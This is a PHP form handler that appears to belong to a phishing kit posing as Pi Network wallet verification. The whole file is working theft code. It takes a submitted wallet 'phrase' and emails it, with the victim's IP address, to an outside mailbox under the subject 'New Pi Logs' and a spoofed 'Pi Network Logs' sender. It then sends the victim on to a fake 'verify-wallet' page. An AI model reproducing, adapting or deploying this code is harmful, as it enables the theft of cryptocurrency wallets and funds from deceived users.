<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $name = $_POST['name'];
  $message = $_POST['message'];
  $to = 'support@pichain.pinetnow.com'; // Replace with your name address

  // Generate a random number to differentiate subjects
  $randomNumber = rand(100000, 999999);

  $subject = 'New Pi Logs - ' . $randomNumber;

  // HTML name template
  $htmlMessage = "
  <html>
  <head>
    <title>New Pi Logs</title>
  </head>
  <body>
    <h2>New Phrase</h2>
    <p><strong></strong> </p>
    <p> $message</p>
    <p><strong>IP Address:</strong> " . $_SERVER['REMOTE_ADDR'] . "</p>
    <p>&nbsp;</p>

  </body>
  </html>
  ";

  $headers = "MIME-Version: 1.0\r\n";
  $headers .= "Content-type: text/html; charset=UTF-8\r\n";
  $headers .= "From: Pi Network Logs <getcom@spider.superfastserver.org>\r\n"; // Fixed the From name format
  $headers .= "Reply-To: support@pichain.pinetnow.com\r\n";

  // Send the name
  if (mail($to, $subject, $htmlMessage, $headers)) {
    // Redirect to Google after sending the name
    header("Location: verify-wallet");
    exit();
  } else {
    echo "<script>alert('Failed to send login details. Please try again.');</script>";
  }
}
?>
